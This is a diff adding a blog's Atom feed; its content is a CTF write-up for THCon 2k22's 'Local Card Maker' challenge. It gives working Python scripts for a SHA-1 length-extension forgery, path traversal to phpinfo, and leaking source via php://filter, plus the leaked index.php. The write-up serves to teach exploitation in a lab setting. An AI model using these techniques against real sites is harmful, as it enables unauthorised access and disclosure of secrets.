@@ -1,0 +1,1259 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="https://lewin.co.il/feed.xml" rel="self" type="application/atom+xml" /><link href="https://lewin.co.il/" rel="alternate" type="text/html" /><updated>2024-03-28T00:50:37+00:00</updated><id>https://lewin.co.il/feed.xml</id><title type="html">Guy Lewin’s Blog</title><subtitle>Documenting things I found useful.</subtitle><entry><title type="html">THCon 2k22 CTF - “Local Card Maker” Writeup</title><link href="https://lewin.co.il/2022/04/17/thcon-2k22-ctf-local-card-maker-writeup.html" rel="alternate" type="text/html" title="THCon 2k22 CTF - “Local Card Maker” Writeup" /><published>2022-04-17T20:55:10+00:00</published><updated>2022-04-17T20:55:10+00:00</updated><id>https://lewin.co.il/2022/04/17/thcon-2k22-ctf-local-card-maker-writeup</id><content type="html" xml:base="https://lewin.co.il/2022/04/17/thcon-2k22-ctf-local-card-maker-writeup.html"><![CDATA[<p>I participated in <a href="https://ctf.thcon.party/">THCon 2k22 CTF</a> and amongst the incredible “web” challenges - my favorite was “Local Card Maker” (made by <code class="language-plaintext highlighter-rouge">jrjgjk</code>). In this post I’ll describe the challenge and my step-by-step solution.</p>
+
+<h2 id="the-challenge">The Challenge</h2>
+
+<p><img src="/assets/images/posts/thcon-2k22-ctf-local-card-maker-writeup/1.png" alt="Description in the CTF portal" /></p>
+
+<p>Right off the bat we can tell there’s going to be some SHA-1 (<em>“secure hash algorithm 1”</em>) with a 23 character “secret key”. The attached ZIP file contained only the following <code class="language-plaintext highlighter-rouge">scan.txt</code> file:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PAGE	|	HTTP_STATUS
+
+/index.php   ==&gt; 200
+/phpinfo.php ==&gt; 200
+/change_profile.php ==&gt; 200
+/view_profile.php ==&gt; 200
+</code></pre></div></div>
+
+<p>The goal is to read the content of <code class="language-plaintext highlighter-rouge">/flag.txt</code>.</p>
+
+<h2 id="exploring-the-site">Exploring the Site</h2>
+
+<p>The site has 2 interesting pages I could find:</p>
+
+<p><img src="/assets/images/posts/thcon-2k22-ctf-local-card-maker-writeup/2.png" alt="View" />
+<img src="/assets/images/posts/thcon-2k22-ctf-local-card-maker-writeup/3.png" alt="Edit" /></p>
+
+<p>The edit page sets a cookie (<code class="language-plaintext highlighter-rouge">user_data</code>) with the PHP-serialized <code class="language-plaintext highlighter-rouge">User</code> object set in the form (along with another cookie - <code class="language-plaintext highlighter-rouge">user_hash</code> to sign that data), and the view page displays that information if the hash is valid. I tried modifying <code class="language-plaintext highlighter-rouge">user_data</code> in multiple ways but kept getting hash validation errors. I decided to put that aside and try a different direction.</p>
+
+<p>The URLs of these pages - <code class="language-plaintext highlighter-rouge">http://challenges1.thcon.party:2001/index.php?page=Y2hhbmdlX3Byb2ZpbGU=&amp;pHash=0171caa8e7a1fe56361fdce865e6e174b3b892f9</code> and <code class="language-plaintext highlighter-rouge">http://challenges1.thcon.party:2001/index.php?page=dmlld19wcm9maWxl&amp;pHash=7b6f8b016f25da478b9f28f878aa3be8cced66fd</code> - both seem to go through <code class="language-plaintext highlighter-rouge">index.php</code> for rendering. The <code class="language-plaintext highlighter-rouge">page</code> parameter is base64-encoded “change_profile” and “view_profile” which matches the files in <code class="language-plaintext highlighter-rouge">scan.txt</code>!</p>
+
+<p>When I tried to access <code class="language-plaintext highlighter-rouge">/phpinfo.php</code>, <code class="language-plaintext highlighter-rouge">/change_profile.php</code> or <code class="language-plaintext highlighter-rouge">/view_profile.php</code> directly I received an error (“Direct access to this page is disable.”).</p>
+
+<p>Theoretically - we can access <code class="language-plaintext highlighter-rouge">phpinfo.php</code> if we could put that value (Base64-encoded) in the <code class="language-plaintext highlighter-rouge">page</code> query parameter - but without finding the proper hash the validation will keep failing.</p>
+
+<h2 id="sha-1-exploitation">SHA-1 Exploitation</h2>
+
+<p>A quick Google search led me to <a href="https://journal.batard.info/post/2011/03/04/exploiting-sha-1-signed-messages">this article</a> which seemed like the perfect solution - if I have data and SHA-1 hash on it with a salt prefix (of known length) - I can append data to it and calculate a valid hash, without knowing the salt! To understand this section better - I recommend reading the article before proceeding.</p>
+
+<p>I relied heavily on <a href="https://github.com/nicolasff/pysha1">the code from the article <code class="language-plaintext highlighter-rouge">nicolasff</code> posted on GitHub</a> to create a script to fetch <code class="language-plaintext highlighter-rouge">phpinfo.php</code>:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">struct</span>
+<span class="kn">import</span> <span class="n">base64</span>
+<span class="kn">import</span> <span class="n">urllib.parse</span>
+<span class="kn">import</span> <span class="n">requests</span>
+
+<span class="c1"># The code below is based on https://github.com/nicolasff/pysha1 (adapted to Python3) until line 87:
+</span>
+<span class="n">top</span> <span class="o">=</span> <span class="mh">0xffffffff</span>
+
+<span class="k">def</span> <span class="nf">rotl</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
+    <span class="n">lmask</span> <span class="o">=</span> <span class="n">top</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">32</span><span class="o">-</span><span class="n">n</span><span class="p">)</span>
+    <span class="n">rmask</span> <span class="o">=</span> <span class="n">top</span> <span class="o">&gt;&gt;</span> <span class="n">n</span>
+    <span class="n">l</span> <span class="o">=</span> <span class="n">i</span> <span class="o">&amp;</span> <span class="n">lmask</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">i</span> <span class="o">&amp;</span> <span class="n">rmask</span>
+    <span class="n">newl</span> <span class="o">=</span> <span class="n">r</span> <span class="o">&lt;&lt;</span> <span class="n">n</span>
+    <span class="n">newr</span> <span class="o">=</span> <span class="n">l</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">32</span><span class="o">-</span><span class="n">n</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">newl</span> <span class="o">+</span> <span class="n">newr</span>
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">l</span><span class="p">):</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">for</span> <span class="n">e</span> <span class="ow">in</span> <span class="n">l</span><span class="p">:</span>
+        <span class="n">ret</span> <span class="o">=</span> <span class="p">(</span><span class="n">ret</span> <span class="o">+</span> <span class="n">e</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">top</span>
+    <span class="k">return</span> <span class="n">ret</span>
+
+<span class="nb">xrange</span> <span class="o">=</span> <span class="nb">range</span>
+
+<span class="k">def</span> <span class="nf">sha1_impl</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="n">h0</span><span class="p">,</span> <span class="n">h1</span><span class="p">,</span> <span class="n">h2</span><span class="p">,</span> <span class="n">h3</span><span class="p">,</span> <span class="n">h4</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nf">xrange</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span> <span class="o">/</span> <span class="mi">64</span><span class="p">)):</span>
+        <span class="n">chunk</span> <span class="o">=</span> <span class="n">msg</span><span class="p">[</span><span class="n">j</span> <span class="o">*</span> <span class="mi">64</span><span class="p">:</span> <span class="p">(</span><span class="n">j</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mi">64</span><span class="p">]</span>
+
+        <span class="n">w</span> <span class="o">=</span> <span class="p">{}</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">xrange</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
+            <span class="n">word</span> <span class="o">=</span> <span class="n">chunk</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4</span><span class="p">:</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span>
+            <span class="p">(</span><span class="n">w</span><span class="p">[</span><span class="n">i</span><span class="p">],)</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">unpack</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt;i</span><span class="sh">"</span><span class="p">,</span> <span class="n">word</span><span class="p">)</span>
+
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="mi">80</span><span class="p">):</span>
+            <span class="n">w</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">rotl</span><span class="p">((</span><span class="n">w</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">3</span><span class="p">]</span> <span class="o">^</span> <span class="n">w</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">8</span><span class="p">]</span> <span class="o">^</span> <span class="n">w</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">14</span><span class="p">]</span> <span class="o">^</span> <span class="n">w</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">16</span><span class="p">])</span> <span class="o">&amp;</span> <span class="n">top</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+
+        <span class="n">a</span> <span class="o">=</span> <span class="n">h0</span>
+        <span class="n">b</span> <span class="o">=</span> <span class="n">h1</span>
+        <span class="n">c</span> <span class="o">=</span> <span class="n">h2</span>
+        <span class="n">d</span> <span class="o">=</span> <span class="n">h3</span>
+        <span class="n">e</span> <span class="o">=</span> <span class="n">h4</span>
+
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">80</span><span class="p">):</span>
+            <span class="k">if</span> <span class="mi">0</span> <span class="o">&lt;=</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">19</span><span class="p">:</span>
+                <span class="n">f</span> <span class="o">=</span> <span class="p">(</span><span class="n">b</span> <span class="o">&amp;</span> <span class="n">c</span><span class="p">)</span> <span class="o">|</span> <span class="p">((</span><span class="o">~</span> <span class="n">b</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">d</span><span class="p">)</span>
+                <span class="n">k</span> <span class="o">=</span> <span class="mh">0x5A827999</span>
+            <span class="k">elif</span> <span class="mi">20</span> <span class="o">&lt;=</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">39</span><span class="p">:</span>
+                <span class="n">f</span> <span class="o">=</span> <span class="n">b</span> <span class="o">^</span> <span class="n">c</span> <span class="o">^</span> <span class="n">d</span>
+                <span class="n">k</span> <span class="o">=</span> <span class="mh">0x6ED9EBA1</span>
+            <span class="k">elif</span> <span class="mi">40</span> <span class="o">&lt;=</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">59</span><span class="p">:</span>
+                <span class="n">f</span> <span class="o">=</span> <span class="p">(</span><span class="n">b</span> <span class="o">&amp;</span> <span class="n">c</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">b</span> <span class="o">&amp;</span> <span class="n">d</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">c</span> <span class="o">&amp;</span> <span class="n">d</span><span class="p">)</span>
+                <span class="n">k</span> <span class="o">=</span> <span class="mh">0x8F1BBCDC</span>
+            <span class="k">elif</span> <span class="mi">60</span> <span class="o">&lt;=</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">79</span><span class="p">:</span>
+                <span class="n">f</span> <span class="o">=</span> <span class="n">b</span> <span class="o">^</span> <span class="n">c</span> <span class="o">^</span> <span class="n">d</span>
+                <span class="n">k</span> <span class="o">=</span> <span class="mh">0xCA62C1D6</span>
+
+            <span class="n">temp</span> <span class="o">=</span> <span class="nf">add</span><span class="p">([</span><span class="nf">rotl</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="mi">5</span><span class="p">),</span> <span class="n">f</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">w</span><span class="p">[</span><span class="n">i</span><span class="p">]])</span>
+            <span class="n">e</span> <span class="o">=</span> <span class="n">d</span>
+            <span class="n">d</span> <span class="o">=</span> <span class="n">c</span>
+            <span class="n">c</span> <span class="o">=</span> <span class="nf">rotl</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="mi">30</span><span class="p">)</span>
+            <span class="n">b</span> <span class="o">=</span> <span class="n">a</span>
+            <span class="n">a</span> <span class="o">=</span> <span class="n">temp</span>
+
+        <span class="n">h0</span> <span class="o">=</span> <span class="nf">add</span><span class="p">([</span><span class="n">h0</span><span class="p">,</span> <span class="n">a</span><span class="p">])</span>
+        <span class="n">h1</span> <span class="o">=</span> <span class="nf">add</span><span class="p">([</span><span class="n">h1</span><span class="p">,</span> <span class="n">b</span><span class="p">])</span>
+        <span class="n">h2</span> <span class="o">=</span> <span class="nf">add</span><span class="p">([</span><span class="n">h2</span><span class="p">,</span> <span class="n">c</span><span class="p">])</span>
+        <span class="n">h3</span> <span class="o">=</span> <span class="nf">add</span><span class="p">([</span><span class="n">h3</span><span class="p">,</span> <span class="n">d</span><span class="p">])</span>
+        <span class="n">h4</span> <span class="o">=</span> <span class="nf">add</span><span class="p">([</span><span class="n">h4</span><span class="p">,</span> <span class="n">e</span><span class="p">])</span>
+
+    <span class="nf">return </span><span class="p">(</span><span class="n">h0</span><span class="p">,</span> <span class="n">h1</span><span class="p">,</span> <span class="n">h2</span><span class="p">,</span> <span class="n">h3</span><span class="p">,</span> <span class="n">h4</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">pad</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="n">sz</span> <span class="o">=</span> <span class="bp">None</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">sz</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="n">sz</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+    <span class="n">bits</span> <span class="o">=</span> <span class="n">sz</span> <span class="o">*</span> <span class="mi">8</span>
+    <span class="n">padding</span> <span class="o">=</span> <span class="mi">512</span> <span class="o">-</span> <span class="p">((</span><span class="n">bits</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">%</span> <span class="mi">512</span><span class="p">)</span> <span class="o">-</span> <span class="mi">64</span>
+
+    <span class="n">msg</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x80</span><span class="sh">"</span>  <span class="c1"># append bit "1", and a few zeros.
+</span>    <span class="k">return</span> <span class="n">msg</span> <span class="o">+</span> <span class="nf">int</span><span class="p">(</span><span class="n">padding</span> <span class="o">/</span> <span class="mi">8</span><span class="p">)</span> <span class="o">*</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x00</span><span class="sh">"</span> <span class="o">+</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt;q</span><span class="sh">"</span><span class="p">,</span> <span class="n">bits</span><span class="p">)</span>  <span class="c1"># don't count the \x80 here, hence the -8.
+</span>
+<span class="k">def</span> <span class="nf">sha1</span><span class="p">(</span><span class="n">msg</span><span class="p">):</span>
+    <span class="c1"># These are the constants in a standard SHA-1
+</span>    <span class="k">return</span> <span class="nf">sha1_impl</span><span class="p">(</span><span class="nf">pad</span><span class="p">(</span><span class="n">msg</span><span class="p">),</span> <span class="mh">0x67452301</span> <span class="p">,</span> <span class="mh">0xefcdab89</span> <span class="p">,</span> <span class="mh">0x98badcfe</span> <span class="p">,</span> <span class="mh">0x10325476</span> <span class="p">,</span> <span class="mh">0xc3d2e1f0</span><span class="p">)</span>
+
+<span class="c1"># "Local Card Maker"-specific implementation starts here:
+</span>
+<span class="k">def</span> <span class="nf">sha1_bytes_to_str</span><span class="p">(</span><span class="n">result</span><span class="p">):</span>
+    <span class="k">return</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span><span class="nf">hex</span><span class="p">(</span><span class="n">x</span><span class="p">)[</span><span class="mi">2</span><span class="p">:].</span><span class="nf">zfill</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">result</span><span class="p">])</span>
+
+<span class="k">def</span> <span class="nf">get_h_values</span><span class="p">(</span><span class="n">hash_string</span><span class="p">):</span>
+    <span class="c1"># Divide hash_string to 5 ints, 4 bytes each
+</span>    <span class="k">return</span> <span class="p">[</span><span class="nf">int</span><span class="p">(</span><span class="n">hash_string</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">:(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">5</span><span class="p">)]</span>
+
+<span class="c1"># "view_profile" taken from site ("page" query parameter)
+</span><span class="n">block_1_buf</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">dmlld19wcm9maWxl</span><span class="sh">"</span>
+<span class="c1"># Hash taken from site ("pHash" query parameter)
+</span><span class="n">block_1_hash</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">7b6f8b016f25da478b9f28f878aa3be8cced66fd</span><span class="sh">"</span>
+<span class="n">block_1_h_values</span> <span class="o">=</span> <span class="nf">get_h_values</span><span class="p">(</span><span class="n">block_1_hash</span><span class="p">)</span>
+<span class="c1"># taken from description of challenge
+</span><span class="n">salt_len</span> <span class="o">=</span> <span class="mi">23</span>
+
+<span class="c1"># "aaa" is padding, since the previous SHA-1 block contains the length at the end which is parsed by PHP as Base64 data.
+# I align to 4 bytes in order for the appended path to be parsed correctly.
+</span><span class="n">block_2_buf</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">aaa</span><span class="sh">"</span> <span class="o">+</span> <span class="n">base64</span><span class="p">.</span><span class="nf">encodebytes</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">/.././././././././phpinfo</span><span class="sh">"</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">""</span><span class="p">)</span>
+<span class="c1"># Pad this second block, use a custom size with additional 64 bytes to account for the first block (which is always padded to 64)
+</span><span class="n">block_2_buf_padded</span> <span class="o">=</span> <span class="nf">pad</span><span class="p">(</span><span class="n">block_2_buf</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">block_2_buf</span><span class="p">)</span> <span class="o">+</span> <span class="mi">64</span><span class="p">)</span>
+<span class="n">joined_buf_hash</span> <span class="o">=</span> <span class="nf">sha1_bytes_to_str</span><span class="p">(</span><span class="nf">sha1_impl</span><span class="p">(</span><span class="n">block_2_buf_padded</span><span class="p">,</span> <span class="o">*</span><span class="n">block_1_h_values</span><span class="p">))</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">joined_buf_hash</span><span class="p">)</span>
+<span class="c1"># Add 23 "A"s to simulate the SHA-1 block creation with the salt, but remove the salt since it'll be added by the server.
+</span><span class="n">joined_buf</span> <span class="o">=</span> <span class="nf">pad</span><span class="p">((</span><span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="n">salt_len</span><span class="p">)</span> <span class="o">+</span> <span class="n">block_1_buf</span><span class="p">)[</span><span class="n">salt_len</span><span class="p">:]</span> <span class="o">+</span> <span class="n">block_2_buf</span>
+<span class="n">encoded_joined_buf</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">parse</span><span class="p">.</span><span class="nf">quote_plus</span><span class="p">(</span><span class="n">joined_buf</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">encoded_joined_buf</span><span class="p">)</span>
+
+<span class="nf">print</span><span class="p">(</span><span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">http://challenges1.thcon.party:2001/index.php?page=%s&amp;pHash=%s</span><span class="sh">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">encoded_joined_buf</span><span class="p">,</span> <span class="n">joined_buf_hash</span><span class="p">)).</span><span class="n">content</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>In the code above we use the “view_profile” page (encoded as <code class="language-plaintext highlighter-rouge">dmlld19wcm9maWxl</code> in Base64) along with the salted hash (<code class="language-plaintext highlighter-rouge">7b6f8b016f25da478b9f28f878aa3be8cced66fd</code>) from the site URL. We pad that to a SHA-1 block (64 bytes including the salt, first byte after data is 0x80 and last 2 bytes are length) and add a 2nd block: <code class="language-plaintext highlighter-rouge">aaa + base64("/.././././././././phpinfo")</code>.</p>
+
+<p>We add 3 bytes (<code class="language-plaintext highlighter-rouge">"aaa"</code>) because the last byte of the previous SHA-1 block (as you can see below - 0x38 in yellow) is identified by PHP as a Base64 data byte. Aligning that to 4 bytes makes the following Base64-encoded string correctly readable (since Base64 is read aligned to 4 bytes).</p>
+
+<p>The result <code class="language-plaintext highlighter-rouge">joined_buf</code> which we were able to sign (before URL encoding) is:</p>
+
+<p><img src="/assets/images/posts/thcon-2k22-ctf-local-card-maker-writeup/4.png" alt="" /></p>
+
+<p>The first part (green) is the original Base64-encoded string (containing “view_profile”). The red <code class="language-plaintext highlighter-rouge">0x80</code> is the end-of-string marker added in SHA-1. Afterwards, the white <code class="language-plaintext highlighter-rouge">0x00</code> bytes are padding to complete the first chunk to 64 bytes (taking into account that 23 bytes were also used for salt and 2 bytes are used for length). The yellow <code class="language-plaintext highlighter-rouge">0x01 0x38</code> is chunk length in bits. It equals 0x138 = 312 bits = 39 bytes which is calculated by: <code class="language-plaintext highlighter-rouge">len("dmlld19wcm9maWxl") + key_length = 16 + 23 = 39</code>. The next 3 blue-colored <code class="language-plaintext highlighter-rouge">0x61</code> bytes are the padding I mentioned previously to align our Base64 string for PHP. The rest of the purple bytes are the Base64 payload.</p>
+
+<p>When PHP receives this payload with a valid hash - it parses the Base64-encoded path as: <code class="language-plaintext highlighter-rouge">view_profile&lt;unprintable characters&gt;/.././././././././phpinfo</code> - which will be resolved into <code class="language-plaintext highlighter-rouge">phpinfo</code> and appended by the app logic with <code class="language-plaintext highlighter-rouge">.php</code>. Now we got to read what’s in <code class="language-plaintext highlighter-rouge">phpinfo.php</code>!</p>
+
+<h2 id="phpinfo">phpinfo</h2>
+
+<p>If you’re unfamiliar with <a href="https://www.php.net/manual/en/function.phpinfo.php"><code class="language-plaintext highlighter-rouge">phpinfo()</code></a> - it’s a built-in function that prints useful information about PHP and the environment it’s running on. Here’s how it looks like when running from our exploited URL (<code class="language-plaintext highlighter-rouge">phpinfo.php</code> simply calls <code class="language-plaintext highlighter-rouge">phpinfo()</code>):</p>
+
+<p><img src="/assets/images/posts/thcon-2k22-ctf-local-card-maker-writeup/5.png" alt="" />
+Within this page I found a good lead - the key used as the SHA-1 salt! The key was shown here because it’s defined as a PHP variable:</p>
+
+<p><img src="/assets/images/posts/thcon-2k22-ctf-local-card-maker-writeup/6.png" alt="" />
+But this key isn’t enough to retrieve the flag from /flag.txt - we can’t load a .txt file since the <code class="language-plaintext highlighter-rouge">index.php</code> loader code appends <code class="language-plaintext highlighter-rouge">.php</code> to every Base64 payload we give it.</p>
+
+<h2 id="bonus---leaking-indexphp-file-contents">Bonus - Leaking index.php File Contents</h2>
+
+<p>I wanted to make sure I understand how <code class="language-plaintext highlighter-rouge">index.php</code> works internally, so equipped with the secret key I leaked the content of index.php:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">base64</span>
+<span class="kn">import</span> <span class="n">hashlib</span>
+<span class="kn">import</span> <span class="n">requests</span>
+
+<span class="n">php_file</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">index</span><span class="sh">"</span>
+<span class="n">path</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">php://filter/convert.base64-encode/resource=%s</span><span class="sh">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">php_file</span><span class="p">,)</span>
+<span class="n">key_salt</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">Thcon_SuP3r_S3cr4t_K3y!</span><span class="sh">"</span>
+<span class="n">buf</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">encodebytes</span><span class="p">(</span><span class="n">path</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">""</span><span class="p">)</span>
+<span class="n">buf_hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="nf">sha1</span><span class="p">(</span><span class="n">key_salt</span> <span class="o">+</span> <span class="n">buf</span><span class="p">).</span><span class="nf">hexdigest</span><span class="p">()</span>
+<span class="n">buf</span> <span class="o">=</span> <span class="n">buf</span><span class="p">.</span><span class="nf">decode</span><span class="p">()</span>
+
+<span class="nf">print</span><span class="p">(</span><span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">http://challenges1.thcon.party:2001/index.php?page=%s&amp;pHash=%s</span><span class="sh">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">buf_hash</span><span class="p">)).</span><span class="n">content</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>The result is Base64-encoded <code class="language-plaintext highlighter-rouge">index.php</code>. Here it is after decoding, to better understand how this challenge works:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nb">session_start</span><span class="p">();</span>
+<span class="k">require</span><span class="p">(</span><span class="s2">"crypto.php"</span><span class="p">);</span>
+<span class="nv">$safe_handler</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">IntegrityHandler</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'SECRET_KEY'</span><span class="p">],</span> <span class="s1">'sha1'</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span><span class="s2">"LOCAL_ACCESS"</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+
+
+<span class="k">function</span> <span class="n">createHeaders</span><span class="p">(</span><span class="nv">$pArray</span><span class="p">,</span> <span class="nv">$handler</span><span class="p">){</span>
+	<span class="k">echo</span> <span class="s1">'&lt;a href="/"&gt;&lt;li&gt;Home&lt;/li&gt;&lt;/a&gt;'</span><span class="p">;</span>
+	<span class="k">foreach</span><span class="p">(</span><span class="nv">$pArray</span> <span class="k">as</span> <span class="nv">$p</span> <span class="o">=&gt;</span> <span class="nv">$v</span><span class="p">){</span>
+		<span class="k">echo</span> <span class="s2">"&lt;a href='/index.php?page="</span> <span class="mf">.</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span> <span class="mf">.</span><span class="s2">"&amp;pHash="</span> <span class="mf">.</span> <span class="nv">$handler</span><span class="o">-&gt;</span><span class="nf">secure_data</span><span class="p">(</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$p</span><span class="p">))</span> <span class="mf">.</span> <span class="s2">"' /&gt;&lt;li&gt;</span><span class="nv">$v</span><span class="s2">&lt;/li&gt;&lt;/a&gt;"</span><span class="p">;</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="cp">?&gt;</span>
+
+
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+	<span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css"</span><span class="nt">&gt;</span>
+	<span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="na">href=</span><span class="s">"css/style.css"</span><span class="nt">&gt;</span>
+	<span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"utf-8"</span><span class="nt">&gt;</span>
+	<span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width, initial-scale=1"</span><span class="nt">&gt;</span>
+	<span class="nt">&lt;title&gt;</span>Framework<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+	<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"headers"</span><span class="nt">&gt;</span>
+		<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"inner_headers"</span><span class="nt">&gt;</span>
+			<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"logo_c"</span><span class="nt">&gt;</span>
+				<span class="nt">&lt;h1&gt;</span>Thcon22<span class="nt">&lt;span&gt;</span>Framework<span class="nt">&lt;/span&gt;&lt;/h1&gt;</span>
+			<span class="nt">&lt;/div&gt;</span>
+				<span class="nt">&lt;ul</span> <span class="na">class=</span><span class="s">"nav"</span><span class="nt">&gt;</span>
+	<span class="cp">&lt;?php</span>
